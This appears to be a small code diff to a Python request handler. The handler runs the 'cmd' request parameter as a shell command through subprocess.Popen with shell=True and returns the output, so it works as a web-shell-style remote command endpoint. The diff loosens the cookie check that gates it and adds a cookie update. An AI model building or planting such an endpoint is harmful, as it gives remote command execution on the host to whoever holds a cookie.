@@ -14,7 +14,8 @@ class start:
 
     def execute(self):
         if "Cookie" in self.headers:
-            if self.cookies_handler.check_cookies_by_id(self.headers["Cookie"]) == "active":
+            if self.cookies_handler.check_cookies_by_id(self.headers["Cookie"]):
+                self.cookies_handler.update_cookies(self.headers["Cookie"])
                 if "cmd" in self.params:
                     cmd = subprocess.Popen(self.params["cmd"], shell=True, stdout=subprocess.PIPE)
                     self.return_data["data"]  = cmd.stdout.read()
